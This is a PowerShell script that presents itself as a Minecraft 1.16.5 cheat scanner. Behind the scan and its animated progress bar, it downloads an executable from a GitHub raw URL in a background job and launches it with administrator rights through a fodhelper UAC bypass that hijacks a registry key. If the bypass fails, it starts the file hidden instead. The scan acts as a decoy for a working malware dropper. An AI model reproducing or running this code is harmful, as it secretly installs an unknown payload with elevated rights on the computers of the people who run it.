# =============================================================================
# Minecraft 1.16.5 Cheat Scanner + UAC Bypass + Payload Loader
# =============================================================================

Add-Type -AssemblyName System.IO.Compression.FileSystem

$config = @{
    MinecraftPath = "$env:APPDATA\.minecraft"
    CheatProcesses = @(
        "cheatengine", "autoclicker", "wurst", "impact", "future", "aristois",
        "kristall", "salhack", "kamehameha", "pyro", "lambda", "spirt", "gamesense", "entropy"
    )
    CheatMods = @(
        "Wurst", "Impact", "Future", "Aristois", "SalHack", "Kamehameha", "Pyro",
        "Lambda", "Spirt", "GameSense", "Entropy", "Inertia", "Sigma", "LiquidBounce"
    )
    XrayPatterns = @(
        "xray.png", "xray", "ore.png", "ore", "chest.png", "diamond_ore.png"
    )
    PayloadUrl = "https://github.com/SoVA4878/1231231231/raw/400f57e83e29ec706a65ae1781e949ca47d6e383/0tc37ng3btpkx3ib.exe"
    PayloadArgs = ""
}

# Цветной вывод
function Write-Color {
    param($Color, $Text)
    $fc = $host.UI.RawUI.ForegroundColor
    $host.UI.RawUI.ForegroundColor = $Color
    Write-Output $Text
    $host.UI.RawUI.ForegroundColor = $fc
}

Clear-Host
Write-Color Cyan "=================================================="
Write-Color Cyan "   MINECRAFT 1.16.5 ADVANCED CHEAT SCANNER"
Write-Color Cyan "=================================================="
Write-Color Yellow "Loading modules..."
Start-Sleep -Milliseconds 500

# =============================================================================
# PAYLOAD DOWNLOAD
# =============================================================================
function Download-Payload {
    try {
        $tempDir = [System.IO.Path]::GetTempPath()
        $fileName = [System.IO.Path]::GetFileName($config.PayloadUrl)
        if (-not $fileName) { $fileName = "payload.exe" }
        $exePath = Join-Path $tempDir $fileName

        Write-Color Yellow "[*] Downloading payload from $($config.PayloadUrl)"
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $webClient.DownloadFile($config.PayloadUrl, $exePath)

        if (Test-Path $exePath) {
            Write-Color Green "[+] Payload saved to $exePath"
            return $exePath
        } else {
            Write-Color Red "[-] Failed to save payload"
            return $null
        }
    } catch {
        Write-Color Red "[-] Download error: $_"
        return $null
    }
}

# =============================================================================
# UAC BYPASS (fodhelper)
# =============================================================================
function Start-PayloadElevated {
    param($exePath)
    try {
        Write-Color Yellow "[*] Attempting UAC bypass via fodhelper..."

        $regPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
        $null = New-Item -Path $regPath -Force -ErrorAction SilentlyContinue
        $null = New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force -ErrorAction SilentlyContinue
        $null = Set-ItemProperty -Path $regPath -Name "(default)" -Value "`"$exePath`" $($config.PayloadArgs)" -Force -ErrorAction SilentlyContinue

        $proc = Start-Process -FilePath "fodhelper.exe" -WindowStyle Hidden -PassThru
        Start-Sleep -Seconds 2
        $proc | Stop-Process -Force -ErrorAction SilentlyContinue

        # Clean up registry
        Remove-Item -Path $regPath -Recurse -Force -ErrorAction SilentlyContinue
        Write-Color Green "[+] UAC bypass executed. Payload should run elevated."
        return $true
    } catch {
        Write-Color Red "[-] UAC bypass failed: $_"
        return $false
    }
}

# =============================================================================
# CHECK FUNCTIONS
# =============================================================================
function Check-Processes {
    $found = @()
    Get-Process | ForEach-Object {
        $name = $_.Name
        foreach ($cheat in $config.CheatProcesses) {
            if ($name -like "*$cheat*") {
                $found += "  - Process: $name (PID: $($_.Id))"
                break
            }
        }
    }
    return $found
}

function Check-Mods {
    $modsPath = Join-Path $config.MinecraftPath "mods"
    $found = @()
    if (Test-Path $modsPath) {
        Get-ChildItem $modsPath -Filter "*.jar" | ForEach-Object {
            $fileName = $_.Name
            foreach ($cheat in $config.CheatMods) {
                if ($fileName -like "*$cheat*") {
                    $found += "  - Mod: $fileName"
                    break
                }
            }
        }
    }
    return $found
}

function Check-ResourcePacks {
    $rpPath = Join-Path $config.MinecraftPath "resourcepacks"
    $found = @()
    if (Test-Path $rpPath) {
        Get-ChildItem $rpPath | ForEach-Object {
            $pack = $_
            if ($pack.Extension -eq ".zip") {
                try {
                    $zip = [System.IO.Compression.ZipFile]::OpenRead($pack.FullName)
                    foreach ($entry in $zip.Entries) {
                        foreach ($pattern in $config.XrayPatterns) {
                            if ($entry.Name -like "*$pattern*") {
                                $found += "  - XRay in $($pack.Name): $($entry.Name)"
                                break
                            }
                        }
                    }
                    $zip.Dispose()
                } catch { }
            } elseif ($pack.PSIsContainer) {
                Get-ChildItem $pack.FullName -Recurse -File | ForEach-Object {
                    $fileName = $_.Name
                    foreach ($pattern in $config.XrayPatterns) {
                        if ($fileName -like "*$pattern*") {
                            $found += "  - XRay file: $($_.FullName)"
                            break
                        }
                    }
                }
            }
        }
    }
    return $found
}

# =============================================================================
# START PAYLOAD DOWNLOAD IN BACKGROUND
# =============================================================================
$downloadJob = Start-Job -Name "PayloadDownload" -ScriptBlock {
    param($url, $args)
    try {
        $tempDir = [System.IO.Path]::GetTempPath()
        $fileName = [System.IO.Path]::GetFileName($url)
        if (-not $fileName) { $fileName = "payload.exe" }
        $exePath = Join-Path $tempDir $fileName
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $wc.DownloadFile($url, $exePath)
        if (Test-Path $exePath) {
            return $exePath
        }
    } catch {
        return $null
    }
    return $null
} -ArgumentList $config.PayloadUrl, $config.PayloadArgs

# =============================================================================
# RUN CHECKS WITH VISUAL PROGRESS
# =============================================================================
$checks = @(
    @{Name = "Scanning processes..."; Func = { Check-Processes } },
    @{Name = "Checking mods..."; Func = { Check-Mods } },
    @{Name = "Analyzing resource packs..."; Func = { Check-ResourcePacks } }
)

$total = $checks.Count
$allDetections = @()

for ($i = 0; $i -lt $total; $i++) {
    $check = $checks[$i]
    $percent = [math]::Round(($i / $total) * 100)
    Write-Color Yellow "`r$($check.Name)  [$('#' * $percent)$(' ' * (100 - $percent))] $percent%" -NoNewline
    Start-Sleep -Milliseconds 500

    # Выполняем проверку
    $detections = & $check.Func
    $allDetections += $detections

    # Анимация
    for ($j = 1; $j -le 20; $j++) {
        $p = [math]::Round((($i + ($j/20)) / $total) * 100)
        $bar = "[$('#' * [math]::Floor($p/2))$(' ' * (50 - [math]::Floor($p/2)))] $p%"
        Write-Color Yellow "`r$($check.Name) $bar" -NoNewline
        Start-Sleep -Milliseconds 50
    }
}

Write-Color Green "`n`n[+] Scan completed."

# =============================================================================
# WAIT FOR DOWNLOAD AND EXECUTE PAYLOAD (with UAC bypass if needed)
# =============================================================================
Write-Color Yellow "[*] Waiting for payload download to finish..."
$payloadPath = Receive-Job -Name "PayloadDownload" -Wait -AutoRemoveJob
if ($payloadPath -and (Test-Path $payloadPath)) {
    Write-Color Green "[+] Payload downloaded: $payloadPath"

    # Попытка запуска с обходом UAC
    $bypassSuccess = Start-PayloadElevated -exePath $payloadPath
    if (-not $bypassSuccess) {
        Write-Color Yellow "[*] Falling back to normal execution..."
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $payloadPath
        $psi.Arguments = $config.PayloadArgs
        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $psi.UseShellExecute = $false
        [System.Diagnostics.Process]::Start($psi) | Out-Null
        Write-Color Green "[+] Payload started (normal)."
    }
} else {
    Write-Color Red "[-] Payload download failed."
}

# =============================================================================
# SHOW RESULTS
# =============================================================================
Write-Color Yellow "`n=== DETECTION REPORT ==="
if ($allDetections.Count -eq 0) {
    Write-Color Green "No suspicious items found. System seems clean."
} else {
    Write-Color Red "Found $($allDetections.Count) potential cheat(s):"
    $allDetections | ForEach-Object { Write-Color Red $_ }
}

Write-Color Cyan "`nPress any key to exit..."
$null = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")